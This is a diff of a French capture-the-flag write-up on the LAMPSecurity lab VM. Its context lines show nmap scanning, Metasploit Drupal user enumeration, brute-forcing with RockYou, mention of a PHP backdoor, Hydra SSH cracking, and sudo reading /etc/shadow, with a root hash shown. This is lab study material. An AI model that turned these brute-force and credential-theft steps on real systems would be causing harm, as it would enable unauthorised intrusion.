@@ -13,7 +13,7 @@ Cet opus a montré quelques points intéressants par rapport aux précédents qu
 Veni
 ----
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-17 08:53 CEST
 Nmap scan report for 192.168.1.60
 Host is up (0.00018s latency).
@@ -183,7 +183,7 @@ $db_url = 'mysqli://root:JumpUpAndDown@localhost/drupal';
 
 Malheureusement ce mot de passe ne permet pas de passer root (ce serais un peu simple) :  
 
-```plain
+```
 $ ssh root@192.168.1.60
 Welcome to LAMPSecurity Research SSH access!
 #flag#5e937c51b852e1ee90d42ddb5ccb8997
@@ -201,7 +201,7 @@ Sur le ftp publique on trouve un fichier *key* téléchargeable avec comme conte
 
 On peut visualiser la liste des partages SMB mais après impossible d'y accéder en utilisateur anonyme (smbclient retourne une erreur) :  
 
-```plain
+```
 $ nmblookup -A 192.168.1.60
 Looking up status of 192.168.1.60
         LAMPSEC         <00> -         B <ACTIVE> 
@@ -240,7 +240,7 @@ Vidi
 
 Je suis passé sous *Metasploit* pour m'intéresser au *Drupal* installé à la racine.  
 
-```plain
+```
 msf> use auxiliary/scanner/http/drupal_views_user_enum
 msf auxiliary(drupal_views_user_enum) > show options
 
@@ -291,7 +291,7 @@ On obtient une liste d'utilisateur mais elle n'est pas forcément appropriée po
 
 Sur la page /profile des liens vers les différents profils avec les adresses emails. Il suffit de récupérer cela en retirant le *@localhost.localdomain* final.  
 
-```plain
+```
 bdio
 dhart
 gconnor
@@ -325,7 +325,7 @@ Le script est un peu buggé et peu performant. Je n'ai pas pris la peine de le r
 
 Après avoir testé une petite wordlist pour les mots de passe j'ai utilisé celle de *RockYou* que *MadIrish* semble utiliser pour ses challenges.  
 
-```plain
+```
 $ python drupal_bruterforce.py --target=http://192.168.1.60/ --userlist=users.txt --wordlist=rockyou.txt  --version=6
 Please wait, working...
 Drupal 6
@@ -346,7 +346,7 @@ Et enfin lors de l'édition d'un contenu (article, etc.) il faut switcher le *In
 
 Une backdoor classique permet alors d'accéder au système de fichier.  
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
@@ -378,7 +378,7 @@ Vici
 
 Je réutilise les identifiants *Drupal* pour tenter de trouver un compte Unix :  
 
-```plain
+```
 $ ./hydra -L users.txt -P passwords.txt ssh://192.168.1.60
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -404,7 +404,7 @@ Last login: Thu Mar 27 12:48:29 2014 from 192.168.56.1
 
 Dans l'historique bash de *M. Pinkton* on trouve beaucoup de commandes sudo. En fait l'utilisateur peut lancer tout ce qu'il souhaite :  
 
-```plain
+```
 [spinkton@localhost ~]$ sudo head -1 /etc/shadow
 root:$1$.GWA7rU/$lVPNjveio2K8Hpsuk.6N4/:15861:0:99999:7:::
 ```
